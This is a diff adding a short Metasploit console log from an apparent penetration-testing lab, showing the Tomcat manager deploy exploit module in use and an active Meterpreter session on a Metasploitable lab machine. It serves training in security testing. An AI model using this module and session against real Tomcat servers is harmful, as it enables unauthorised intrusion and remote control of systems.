@@ -1,0 +1,21 @@
+[1m[34m[*][0m Spooling to file /home/kali/vapt_lab/task3/results/meterpreter_session_1.txt...
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -v
+[0m
+Active sessions
+===============
+
+  Session ID: 1
+        Name: 
+        Type: meterpreter linux
+        Info: tomcat55 @ metasploitable
+      Tunnel: 192.168.222.128:4444 -> 192.168.222.129:34272 (192.168.222.129)
+         Via: exploit/multi/http/tomcat_mgr_deploy
+   Encrypted: No
+        UUID: 21ba78fb251e671b/java=17/linux=6/2025-10-08T12:32:31Z
+     CheckIn: 9s ago @ 2025-10-08 18:11:25 +0530
+  Registered: No
+
+
+
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> spool off
+[0m
